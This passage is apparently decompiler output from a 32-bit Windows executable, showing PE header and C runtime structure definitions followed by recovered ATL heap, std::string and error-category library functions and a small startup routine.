typedef struct IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

struct IMAGE_DATA_DIRECTORY {
    ImageBaseOffset32 VirtualAddress;
    dword Size;
};

struct IMAGE_OPTIONAL_HEADER32 {
    word Magic;
    byte MajorLinkerVersion;
    byte MinorLinkerVersion;
    dword SizeOfCode;
    dword SizeOfInitializedData;
    dword SizeOfUninitializedData;
    ImageBaseOffset32 AddressOfEntryPoint;
    ImageBaseOffset32 BaseOfCode;
    ImageBaseOffset32 BaseOfData;
    pointer32 ImageBase;
    dword SectionAlignment;
    dword FileAlignment;
    word MajorOperatingSystemVersion;
    word MinorOperatingSystemVersion;
    word MajorImageVersion;
    word MinorImageVersion;
    word MajorSubsystemVersion;
    word MinorSubsystemVersion;
    dword Win32VersionValue;
    dword SizeOfImage;
    dword SizeOfHeaders;
    dword CheckSum;
    word Subsystem;
    word DllCharacteristics;
    dword SizeOfStackReserve;
    dword SizeOfStackCommit;
    dword SizeOfHeapReserve;
    dword SizeOfHeapCommit;
    dword LoaderFlags;
    dword NumberOfRvaAndSizes;
    struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct {
    dword NameOffset;
    dword NameIsString;
};

typedef struct IMAGE_DEBUG_DIRECTORY IMAGE_DEBUG_DIRECTORY, *PIMAGE_DEBUG_DIRECTORY;

struct IMAGE_DEBUG_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    dword Type;
    dword SizeOfData;
    dword AddressOfRawData;
    dword PointerToRawData;
};

typedef struct IMAGE_FILE_HEADER IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

struct IMAGE_FILE_HEADER {
    word Machine; // 332
    word NumberOfSections;
    dword TimeDateStamp;
    dword PointerToSymbolTable;
    dword NumberOfSymbols;
    word SizeOfOptionalHeader;
    word Characteristics;
};

typedef struct IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

struct IMAGE_NT_HEADERS32 {
    char Signature[4];
    struct IMAGE_FILE_HEADER FileHeader;
    struct IMAGE_OPTIONAL_HEADER32 OptionalHeader;
};

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion;

union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion {
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;
    dword Name;
    word Id;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY {
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion NameUnion;
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion DirectoryUnion;
};

typedef struct IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef union Misc Misc, *PMisc;

typedef enum SectionFlags {
    IMAGE_SCN_TYPE_NO_PAD=8,
    IMAGE_SCN_RESERVED_0001=16,
    IMAGE_SCN_CNT_CODE=32,
    IMAGE_SCN_CNT_INITIALIZED_DATA=64,
    IMAGE_SCN_CNT_UNINITIALIZED_DATA=128,
    IMAGE_SCN_LNK_OTHER=256,
    IMAGE_SCN_LNK_INFO=512,
    IMAGE_SCN_RESERVED_0040=1024,
    IMAGE_SCN_LNK_REMOVE=2048,
    IMAGE_SCN_LNK_COMDAT=4096,
    IMAGE_SCN_GPREL=32768,
    IMAGE_SCN_MEM_16BIT=131072,
    IMAGE_SCN_MEM_PURGEABLE=131072,
    IMAGE_SCN_MEM_LOCKED=262144,
    IMAGE_SCN_MEM_PRELOAD=524288,
    IMAGE_SCN_ALIGN_1BYTES=1048576,
    IMAGE_SCN_ALIGN_2BYTES=2097152,
    IMAGE_SCN_ALIGN_4BYTES=3145728,
    IMAGE_SCN_ALIGN_8BYTES=4194304,
    IMAGE_SCN_ALIGN_16BYTES=5242880,
    IMAGE_SCN_ALIGN_32BYTES=6291456,
    IMAGE_SCN_ALIGN_64BYTES=7340032,
    IMAGE_SCN_ALIGN_128BYTES=8388608,
    IMAGE_SCN_ALIGN_256BYTES=9437184,
    IMAGE_SCN_ALIGN_512BYTES=10485760,
    IMAGE_SCN_ALIGN_1024BYTES=11534336,
    IMAGE_SCN_ALIGN_2048BYTES=12582912,
    IMAGE_SCN_ALIGN_4096BYTES=13631488,
    IMAGE_SCN_ALIGN_8192BYTES=14680064,
    IMAGE_SCN_LNK_NRELOC_OVFL=16777216,
    IMAGE_SCN_MEM_DISCARDABLE=33554432,
    IMAGE_SCN_MEM_NOT_CACHED=67108864,
    IMAGE_SCN_MEM_NOT_PAGED=134217728,
    IMAGE_SCN_MEM_SHARED=268435456,
    IMAGE_SCN_MEM_EXECUTE=536870912,
    IMAGE_SCN_MEM_READ=1073741824,
    IMAGE_SCN_MEM_WRITE=2147483648
} SectionFlags;

union Misc {
    dword PhysicalAddress;
    dword VirtualSize;
};

struct IMAGE_SECTION_HEADER {
    char Name[8];
    union Misc Misc;
    ImageBaseOffset32 VirtualAddress;
    dword SizeOfRawData;
    dword PointerToRawData;
    dword PointerToRelocations;
    dword PointerToLinenumbers;
    word NumberOfRelocations;
    word NumberOfLinenumbers;
    enum SectionFlags Characteristics;
};

typedef struct IMAGE_RESOURCE_DATA_ENTRY IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;

struct IMAGE_RESOURCE_DATA_ENTRY {
    dword OffsetToData;
    dword Size;
    dword CodePage;
    dword Reserved;
};

typedef struct IMAGE_RESOURCE_DIRECTORY IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;

struct IMAGE_RESOURCE_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    word NumberOfNamedEntries;
    word NumberOfIdEntries;
};

typedef struct IMAGE_LOAD_CONFIG_DIRECTORY32 IMAGE_LOAD_CONFIG_DIRECTORY32, *PIMAGE_LOAD_CONFIG_DIRECTORY32;

struct IMAGE_LOAD_CONFIG_DIRECTORY32 {
    dword Size;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    dword GlobalFlagsClear;
    dword GlobalFlagsSet;
    dword CriticalSectionDefaultTimeout;
    dword DeCommitFreeBlockThreshold;
    dword DeCommitTotalFreeThreshold;
    pointer32 LockPrefixTable;
    dword MaximumAllocationSize;
    dword VirtualMemoryThreshold;
    dword ProcessHeapFlags;
    dword ProcessAffinityMask;
    word CsdVersion;
    word DependentLoadFlags;
    pointer32 EditList;
    pointer32 SecurityCookie;
    pointer32 SEHandlerTable;
    dword SEHandlerCount;
};

typedef enum _SE_OBJECT_TYPE {
    SE_UNKNOWN_OBJECT_TYPE=0,
    SE_FILE_OBJECT=1,
    SE_SERVICE=2,
    SE_PRINTER=3,
    SE_REGISTRY_KEY=4,
    SE_LMSHARE=5,
    SE_KERNEL_OBJECT=6,
    SE_WINDOW_OBJECT=7,
    SE_DS_OBJECT=8,
    SE_DS_OBJECT_ALL=9,
    SE_PROVIDER_DEFINED_OBJECT=10,
    SE_WMIGUID_OBJECT=11,
    SE_REGISTRY_WOW64_32KEY=12
} _SE_OBJECT_TYPE;

typedef enum _SE_OBJECT_TYPE SE_OBJECT_TYPE;

typedef LONG LSTATUS;

typedef ACCESS_MASK REGSAM;

typedef struct _tiddata _tiddata, *P_tiddata;

typedef struct _tiddata * _ptiddata;

typedef struct setloc_struct setloc_struct, *Psetloc_struct;

typedef struct setloc_struct _setloc_struct;

typedef struct _is_ctype_compatible _is_ctype_compatible, *P_is_ctype_compatible;

struct _is_ctype_compatible {
    ulong id;
    int is_clike;
};

struct setloc_struct {
    wchar_t * pchLanguage;
    wchar_t * pchCountry;
    int iLocState;
    int iPrimaryLen;
    BOOL bAbbrevLanguage;
    BOOL bAbbrevCountry;
    UINT _cachecp;
    wchar_t _cachein[131];
    wchar_t _cacheout[131];
    struct _is_ctype_compatible _Loc_c[5];
    wchar_t _cacheLocaleName[85];
};

struct _tiddata {
    ulong _tid;
    uintptr_t _thandle;
    int _terrno;
    ulong _tdoserrno;
    uint _fpds;
    ulong _holdrand;
    char * _token;
    wchar_t * _wtoken;
    uchar * _mtoken;
    char * _errmsg;
    wchar_t * _werrmsg;
    char * _namebuf0;
    wchar_t * _wnamebuf0;
    char * _namebuf1;
    wchar_t * _wnamebuf1;
    char * _asctimebuf;
    wchar_t * _wasctimebuf;
    void * _gmtimebuf;
    char * _cvtbuf;
    uchar _con_ch_buf[5];
    ushort _ch_buf_used;
    void * _initaddr;
    void * _initarg;
    void * _pxcptacttab;
    void * _tpxcptinfoptrs;
    int _tfpecode;
    pthreadmbcinfo ptmbcinfo;
    pthreadlocinfo ptlocinfo;
    int _ownlocale;
    ulong _NLG_dwCode;
    void * _terminate;
    void * _unexpected;
    void * _translator;
    void * _purecall;
    void * _curexception;
    void * _curcontext;
    int _ProcessingThrow;
    void * _curexcspec;
    void * _pFrameInfoChain;
    _setloc_struct _setloc_data;
    void * _reserved1;
    void * _reserved2;
    void * _reserved3;
    void * _reserved4;
    void * _reserved5;
    int _cxxReThrow;
    ulong __initDomain;
    int _initapartment;
};

typedef struct __crt_multibyte_data __crt_multibyte_data, *P__crt_multibyte_data;

struct __crt_multibyte_data { // PlaceHolder Structure
};

typedef dword unsigned_int;

typedef struct CCommandLineInfo CCommandLineInfo, *PCCommandLineInfo;

struct CCommandLineInfo { // PlaceHolder Structure
};


// WARNING! conflicting data type names: /Demangler/wchar_t - /wchar_t

typedef struct CSimpleArray<struct_HINSTANCE__*,class_ATL::CSimpleArrayEqualHelper<struct_HINSTANCE__*>_> CSimpleArray<struct_HINSTANCE__*,class_ATL::CSimpleArrayEqualHelper<struct_HINSTANCE__*>_>, *PCSimpleArray<struct_HINSTANCE__*,class_ATL::CSimpleArrayEqualHelper<struct_HINSTANCE__*>_>;

struct CSimpleArray<struct_HINSTANCE__*,class_ATL::CSimpleArrayEqualHelper<struct_HINSTANCE__*>_> { // PlaceHolder Structure
};

typedef struct _ATL_BASE_MODULE70 _ATL_BASE_MODULE70, *P_ATL_BASE_MODULE70;

struct _ATL_BASE_MODULE70 { // PlaceHolder Structure
};

typedef struct CSimpleStringT<wchar_t,0> CSimpleStringT<wchar_t,0>, *PCSimpleStringT<wchar_t,0>;

struct CSimpleStringT<wchar_t,0> { // PlaceHolder Structure
};

typedef struct CComCriticalSection CComCriticalSection, *PCComCriticalSection;

struct CComCriticalSection { // PlaceHolder Structure
};

typedef struct CAtlBaseModule CAtlBaseModule, *PCAtlBaseModule;

struct CAtlBaseModule { // PlaceHolder Structure
};

typedef struct CSimpleStringT<char,0> CSimpleStringT<char,0>, *PCSimpleStringT<char,0>;

struct CSimpleStringT<char,0> { // PlaceHolder Structure
};

typedef struct CWin32Heap CWin32Heap, *PCWin32Heap;

struct CWin32Heap { // PlaceHolder Structure
};

typedef struct CAtlArray<void*,class_ATL::CElementTraits<void*>_> CAtlArray<void*,class_ATL::CElementTraits<void*>_>, *PCAtlArray<void*,class_ATL::CElementTraits<void*>_>;

struct CAtlArray<void*,class_ATL::CElementTraits<void*>_> { // PlaceHolder Structure
};

typedef struct error_code error_code, *Perror_code;

struct error_code { // PlaceHolder Structure
};

typedef struct error_condition error_condition, *Perror_condition;

struct error_condition { // PlaceHolder Structure
};

typedef struct basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>, *Pbasic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>;

struct basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> { // PlaceHolder Structure
};




// Library Function - Single Match
//  public: long __thiscall ATL::CComCriticalSection::Init(void)
// 
// Library: Visual Studio 2015 Release

long __thiscall ATL::CComCriticalSection::Init(CComCriticalSection *this)

{
  BOOL BVar1;
  DWORD DVar2;
  
  DVar2 = 0;
  BVar1 = InitializeCriticalSectionAndSpinCount((LPCRITICAL_SECTION)this,0);
  if (BVar1 == 0) {
    DVar2 = GetLastError();
    if (0 < (int)DVar2) {
      DVar2 = DVar2 & 0xffff | 0x80070000;
    }
  }
  return DVar2;
}



// Library Function - Single Match
//  public: virtual __thiscall ATL::CWin32Heap::~CWin32Heap(void)
// 
// Library: Visual Studio 2012 Release

void __thiscall ATL::CWin32Heap::_CWin32Heap(CWin32Heap *this)

{
  *(undefined ***)this = &PTR_FUN_0042da40;
  if ((this[8] != (CWin32Heap)0x0) && (*(int *)(this + 4) != 0)) {
    HeapDestroy(*(HANDLE *)(this + 4));
  }
  return;
}



void __thiscall FUN_00401304(void *this,SIZE_T param_1)

{
  HeapAlloc(*(HANDLE *)((int)this + 4),0,param_1);
  return;
}



void __thiscall FUN_00401319(void *this,LPVOID param_1)

{
  if (param_1 != (LPVOID)0x0) {
    HeapFree(*(HANDLE *)((int)this + 4),0,param_1);
  }
  return;
}



// Library Function - Single Match
//  public: virtual void * __thiscall ATL::CWin32Heap::Reallocate(void *,unsigned int)
// 
// Library: Visual Studio 2012 Release

void * __thiscall ATL::CWin32Heap::Reallocate(CWin32Heap *this,void *param_1,unsigned_int param_2)

{
  void *pvVar1;
  
  if (param_1 == (void *)0x0) {
    pvVar1 = (void *)(***(code ***)this)(param_2);
  }
  else if (param_2 == 0) {
    (**(code **)(*(int *)this + 4))(param_1);
    pvVar1 = (void *)0x0;
  }
  else {
    pvVar1 = HeapReAlloc(*(HANDLE *)(this + 4),0,param_1,param_2);
  }
  return pvVar1;
}



void __thiscall FUN_0040136a(void *this,LPCVOID param_1)

{
  HeapSize(*(HANDLE *)((int)this + 4),0,param_1);
  return;
}



// Library Function - Single Match
//  public: virtual void * __thiscall ATL::CWin32Heap::`scalar deleting destructor'(unsigned int)
// 
// Library: Visual Studio 2012 Release

void * __thiscall
ATL::CWin32Heap::_scalar_deleting_destructor_(CWin32Heap *this,unsigned_int param_1)

{
  _CWin32Heap(this);
  if ((param_1 & 1) != 0) {
    FID_conflict__free(this);
  }
  return this;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined * FUN_0040139e(void)

{
  if ((DAT_00437b30 & 1) == 0) {
    DAT_00437b30 = DAT_00437b30 | 1;
    _DAT_00437b54 = GetProcessHeap();
    _DAT_00437b50 = &PTR_FUN_0042da40;
    DAT_00437b58 = 0;
    FUN_00416e66(&LAB_00427dbf);
  }
  if ((DAT_00437b30 & 2) == 0) {
    _DAT_00437b40 = 0;
    _DAT_00437b44 = 0;
    DAT_00437b30 = DAT_00437b30 | 2;
    _DAT_00437b48 = 2;
    _DAT_00437b34 = &PTR_FUN_0042da54;
    _DAT_00437b38 = &DAT_00437b50;
    _DAT_00437b4c = 0;
    _DAT_00437b3c = &DAT_00437b34;
    FUN_00416e66(&LAB_00427dad);
  }
  return &DAT_00437b34;
}



void FUN_00401433(void)

{
  return;
}



int * __thiscall FUN_00401434(void *this,int param_1,uint param_2)

{
  uint uVar1;
  void **ppvVar2;
  uint uVar3;
  
  if ((((param_1 < 0) || (0x7fffffff - param_1 < 1)) ||
      (uVar3 = param_1 + 8U & 0xfffffff8, (int)uVar3 < param_1 + 1)) ||
     (((uVar1 = (uint)((ulonglong)uVar3 * (ulonglong)param_2),
       (int)((ulonglong)uVar3 * (ulonglong)param_2 >> 0x20) != 0 || (0xffffffef < uVar1)) ||
      (ppvVar2 = (void **)(**(code **)**(undefined4 **)((int)this + 4))(uVar1 + 0x10),
      ppvVar2 == (void **)0x0)))) {
    ppvVar2 = (void **)0x0;
  }
  else {
    ppvVar2[1] = (void *)0x0;
    ppvVar2[2] = (void *)(uVar3 - 1);
    *ppvVar2 = this;
    ppvVar2[3] = (void *)0x1;
  }
  return (int *)ppvVar2;
}



void __fastcall FUN_0040149e(int param_1)

{
                    // WARNING: Could not recover jumptable at 0x004014a7. Too many branches
                    // WARNING: Treating indirect jump as call
  (**(code **)(**(int **)(param_1 + 4) + 4))();
  return;
}



undefined4 * __thiscall FUN_00401518(void *this,byte param_1)

{
  DAT_00438874 = 0;
  *(undefined ***)this = &PTR_FUN_0042da54;
  if ((param_1 & 1) != 0) {
    FID_conflict__free(this);
  }
  return (undefined4 *)this;
}



// Library Function - Single Match
//  public: static unsigned int __cdecl std::char_traits<char>::length(char const *)
// 
// Library: Visual Studio 2012 Release

unsigned_int __cdecl std::char_traits<char>::length(char *param_1)

{
  size_t sVar1;
  
  if (*param_1 == '\0') {
    return 0;
  }
  sVar1 = _strlen(param_1);
  return sVar1;
}



undefined4 * __thiscall FUN_00401557(void *this,byte param_1)

{
  *(undefined ***)this = std::error_category::vftable;
  if ((param_1 & 1) != 0) {
    FID_conflict__free(this);
  }
  return (undefined4 *)this;
}



// Library Function - Single Match
//  public: bool __thiscall std::error_condition::operator==(class std::error_condition const
// &)const 
// 
// Library: Visual Studio 2012 Release

bool __thiscall std::error_condition::operator__(error_condition *this,error_condition *param_1)

{
  bool bVar1;
  
  if ((*(int *)(this + 4) == *(int *)(param_1 + 4)) && (*(int *)this == *(int *)param_1)) {
    bVar1 = true;
  }
  else {
    bVar1 = false;
  }
  return bVar1;
}



void __thiscall FUN_00401596(void *this,undefined4 *param_1,undefined4 param_2)

{
  *param_1 = param_2;
  param_1[1] = this;
  return;
}



void __thiscall FUN_004015a8(void *this,undefined4 param_1,undefined4 param_2)

{
  error_condition *this_00;
  void **ppvVar1;
  void *local_c;
  void *pvStack8;
  
                    // WARNING: Load size is inaccurate
  ppvVar1 = &local_c;
  local_c = this;
  pvStack8 = this;
  this_00 = (error_condition *)(**(code **)(*this + 0xc))(ppvVar1,param_1,param_2);
  std::error_condition::operator__(this_00,(error_condition *)ppvVar1);
  return;
}



// Library Function - Single Match
//  public: virtual bool __thiscall std::error_category::equivalent(class std::error_code const
// &,int)const 
// 
// Libraries: Visual Studio 2010 Release, Visual Studio 2012 Release

bool __thiscall
std::error_category::equivalent(error_category *this,error_code *param_1,int param_2)

{
  bool bVar1;
  
  if ((this == *(error_category **)(param_1 + 4)) && (*(int *)param_1 == param_2)) {
    bVar1 = true;
  }
  else {
    bVar1 = false;
  }
  return bVar1;
}



char * FUN_004015e6(void)

{
  return "generic";
}



// Library Function - Single Match
//  public: virtual class std::basic_string<char,struct std::char_traits<char>,class
// std::allocator<char>> __thiscall std::_Generic_error_category::message(int)const 
// 
// Library: Visual Studio 2019 Release

basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ __thiscall
std::_Generic_error_category::message(_Generic_error_category *this,int param_1)

{
  char *pcVar1;
  
  pcVar1 = (char *)FUN_00422daf((int)this);
  if (pcVar1 == (char *)0x0) {
    pcVar1 = "unknown error";
  }
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::
  basic_string_char_struct_std__char_traits_char__class_std__allocator_char___
            ((basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ *)param_1
             ,pcVar1);
  return SUB41(param_1,0);
}



char * FUN_00401611(void)

{
  return "iostream";
}



// Library Function - Single Match
//  public: virtual class std::basic_string<char,struct std::char_traits<char>,class
// std::allocator<char>> __thiscall std::_Iostream_error_category::message(int)const 
// 
// Library: Visual Studio 2019 Release

basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ __thiscall
std::_Iostream_error_category::message(_Iostream_error_category *this,int param_1)

{
  int in_stack_00000008;
  
  if (in_stack_00000008 == 1) {
    basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::
    basic_string_char_struct_std__char_traits_char__class_std__allocator_char___
              ((basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ *)
               param_1,"iostream stream error");
  }
  else {
    _Generic_error_category::message((_Generic_error_category *)this,param_1);
  }
  return SUB41(param_1,0);
}



char * FUN_00401641(void)

{
  return "system";
}



// Library Function - Multiple Matches With Same Base Name
//  public: virtual class std::basic_string<char,struct std::char_traits<char>,class
// std::allocator<char>> __thiscall std::_Generic_error_category::message(int)const 
//  public: virtual class std::basic_string<char,struct std::char_traits<char>,class
// std::allocator<char>> __thiscall std::_System_error_category::message(int)const 
// 
// Library: Visual Studio 2019 Release

basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ * __fastcall
message(uint *param_1,int param_2,
       basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ *param_3)

{
  char *pcVar1;
  
  pcVar1 = (char *)FUN_00422dd9(param_1,param_2);
  if (pcVar1 == (char *)0x0) {
    pcVar1 = "unknown error";
  }
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::
  basic_string_char_struct_std__char_traits_char__class_std__allocator_char___(param_3,pcVar1);
  return param_3;
}



// Library Function - Single Match
//  public: virtual class std::error_condition __thiscall
// std::_System_error_category::default_error_condition(int)const 
// 
// Library: Visual Studio 2012 Release

error_condition __thiscall
std::_System_error_category::default_error_condition(_System_error_category *this,int param_1)

{
  uint uVar1;
  undefined4 in_stack_00000008;
  
  uVar1 = FUN_00422daf((int)this);
  *(undefined4 *)param_1 = in_stack_00000008;
  if (uVar1 == 0) {
    *(undefined ***)(param_1 + 4) = &PTR_vftable_004367f8;
  }
  else {
    *(undefined ***)(param_1 + 4) = &PTR_vftable_004367fc;
  }
  return SUB41(param_1,0);
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

DWORD FUN_00401698(void)

{
  HMODULE hModule;
  FARPROC pFVar1;
  int *piVar2;
  undefined4 *this;
  DWORD DVar3;
  undefined8 uVar4;
  char *lpProcName;
  uint uVar5;
  uint local_38;
  int local_34;
  undefined4 auStack48 [11];
  
  lpProcName = "SetDefaultDllDirectories";
  hModule = GetModuleHandleW(L"kernel32.dll");
  pFVar1 = GetProcAddress(hModule,lpProcName);
  if (pFVar1 != (FARPROC)0x0) {
    (*pFVar1)(0x800);
  }
  local_38 = local_38 & 0xffffff00;
  _DAT_00437b60 = FUN_00404eea();
  piVar2 = (int *)FUN_00401e9f((CSimpleStringT_char_0_ *)&local_34);
  FUN_00401b2a(&DAT_00437e14,piVar2);
  FUN_00401df0((int **)(local_34 + -0x10));
  uVar4 = FUN_004026a4((undefined *)&local_38);
  DVar3 = (DWORD)uVar4;
  if (-1 < (int)DVar3) {
    uVar5 = local_38;
    this = FUN_004095d0(auStack48);
    DVar3 = FUN_004096de(this,(char)uVar5);
    FUN_0040965c(auStack48);
  }
  DAT_00437b64 = (undefined4)((ulonglong)_DAT_00437b60 >> 0x20);
  return DVar3;
}



// Library Function - Single Match
//  public: __thiscall std::basic_string<char,struct std::char_traits<char>,class
// std::allocator<char>>::basic_string<char,struct std::char_traits<char>,class
// std::allocator<char>>(char const *)
// 
// Library: Visual Studio 2015 Release

basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ * __thiscall
std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::
basic_string_char_struct_std__char_traits_char__class_std__allocator_char___
          (basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ *this,
          char *param_1)

{
  unsigned_int uVar1;
  
  *(undefined4 *)(this + 0x10) = 0;
  *(undefined4 *)(this + 0x14) = 0xf;
  *this = (basic_string_char_struct_std__char_traits_char__class_std__allocator_char___)0x0;
  uVar1 = char_traits<char>::length(param_1);
  assign(this,param_1,uVar1);
  return this;
}



int ** __fastcall
FUN_00401761(int **param_1,undefined2 param_2,int **param_3,int *param_4,int *param_5)

{
  code *pcVar1;
  uint uVar2;
  int **ppiVar3;
  char *unaff_EDI;
  int *_Size;
  
  if (param_3[4] < param_4) {
    FUN_00422ed7((undefined4 *)"invalid string position",unaff_EDI);
    pcVar1 = (code *)swi(3);
    ppiVar3 = (int **)(*pcVar1)();
    return ppiVar3;
  }
  _Size = (int *)((int)param_3[4] - (int)param_4);
  if (param_5 < _Size) {
    _Size = param_5;
  }
  if (param_1 == param_3) {
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::erase
              ((basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ *)
               param_1,(int)param_4 + (int)_Size);
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::erase
              ((basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ *)
               param_1,0,(unsigned_int)param_4);
  }
  else {
    uVar2 = FUN_00401964(param_1,param_2,(char *)_Size,'\0');
    if ((char)uVar2 != '\0') {
      if ((int *)0xf < param_3[5]) {
        param_3 = (int **)*param_3;
      }
      ppiVar3 = param_1;
      if (&DAT_00000010 <= param_1[5]) {
        ppiVar3 = (int **)*param_1;
      }
      if (_Size != (int *)0x0) {
        FID_conflict__memcpy(ppiVar3,(void *)((int)param_4 + (int)param_3),(size_t)_Size);
      }
      param_1[4] = _Size;
      ppiVar3 = param_1;
      if (&DAT_00000010 <= param_1[5]) {
        ppiVar3 = (int **)*param_1;
      }
      *(undefined *)((int)ppiVar3 + (int)_Size) = 0;
    }
  }
  return param_1;
}



// Library Function - Single Match
//  public: void __thiscall std::basic_string<char,struct std::char_traits<char>,class
// std::allocator<char>>::_Tidy(bool,unsigned int)
// 
// Libraries: Visual Studio 2010 Release, Visual Studio 2012 Release, Visual Studio 2019 Release

void __thiscall
std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
          (basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ *this,
          bool param_1,unsigned_int param_2)

{
  void *_Src;
  
  if ((param_1 != false) && (0xf < *(uint *)(this + 0x14))) {
    _Src = *(void **)this;
    if (param_2 != 0) {
      FID_conflict__memcpy(this,_Src,param_2);
    }
    FID_conflict__free(_Src);
  }
  *(unsigned_int *)(this + 0x10) = param_2;
  *(undefined4 *)(this + 0x14) = 0xf;
  this[param_2] = (basic_string_char_struct_std__char_traits_char__class_std__allocator_char___)0x0;
  return;
}



// Library Function - Single Match
//  public: class std::basic_string<char,struct std::char_traits<char>,class std::allocator<char>>&
// __thiscall std::basic_string<char,struct std::char_traits<char>,class
// std::allocator<char>>::assign(char const *,unsigned int)
// 
// Library: Visual Studio 2015 Release

basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ * __thiscall
std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::assign
          (basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ *this,
          char *param_1,unsigned_int param_2)

{
  bool bVar1;
  uint uVar2;
  basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ *pbVar3;
  undefined2 extraout_DX;
  
  bVar1 = _Inside(this,param_1);
  if (bVar1 == false) {
    uVar2 = FUN_00401964((undefined4 *)this,extraout_DX,(char *)param_2,'\0');
    if ((char)uVar2 != '\0') {
      pbVar3 = this;
      if (0xf < *(uint *)(this + 0x14)) {
        pbVar3 = *(basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ **)
                  this;
      }
      if (param_2 != 0) {
        FID_conflict__memcpy(pbVar3,param_1,param_2);
      }
      *(unsigned_int *)(this + 0x10) = param_2;
      pbVar3 = this;
      if (0xf < *(uint *)(this + 0x14)) {
        pbVar3 = *(basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ **)
                  this;
      }
      pbVar3[param_2] =
           (basic_string_char_struct_std__char_traits_char__class_std__allocator_char___)0x0;
    }
  }
  else {
    pbVar3 = this;
    if (0xf < *(uint *)(this + 0x14)) {
      pbVar3 = *(basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ **)
                this;
    }
    this = (basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ *)
           FUN_00401761((int **)this,extraout_DX,(int **)this,(int *)(param_1 + -(int)pbVar3),
                        (int *)param_2);
  }
  return this;
}



// Library Function - Single Match
//  public: class std::basic_string<char,struct std::char_traits<char>,class std::allocator<char>>&
// __thiscall std::basic_string<char,struct std::char_traits<char>,class
// std::allocator<char>>::erase(unsigned int)
// 
// Library: Visual Studio 2012 Release

basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ * __thiscall
std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::erase
          (basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ *this,
          unsigned_int param_1)

{
  code *pcVar1;
  basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ *pbVar2;
  char *unaff_EBP;
  
  if (*(uint *)(this + 0x10) < param_1) {
    FUN_00422ed7((undefined4 *)"invalid string position",unaff_EBP);
    pcVar1 = (code *)swi(3);
    pbVar2 = (basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ *)
             (*pcVar1)();
    return pbVar2;
  }
  *(unsigned_int *)(this + 0x10) = param_1;
  pbVar2 = this;
  if (0xf < *(uint *)(this + 0x14)) {
    pbVar2 = *(basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ **)this;
  }
  pbVar2[param_1] =
       (basic_string_char_struct_std__char_traits_char__class_std__allocator_char___)0x0;
  return this;
}



// Library Function - Single Match
//  public: class std::basic_string<char,struct std::char_traits<char>,class std::allocator<char>>&
// __thiscall std::basic_string<char,struct std::char_traits<char>,class
// std::allocator<char>>::erase(unsigned int,unsigned int)
// 
// Library: Visual Studio 2012 Release

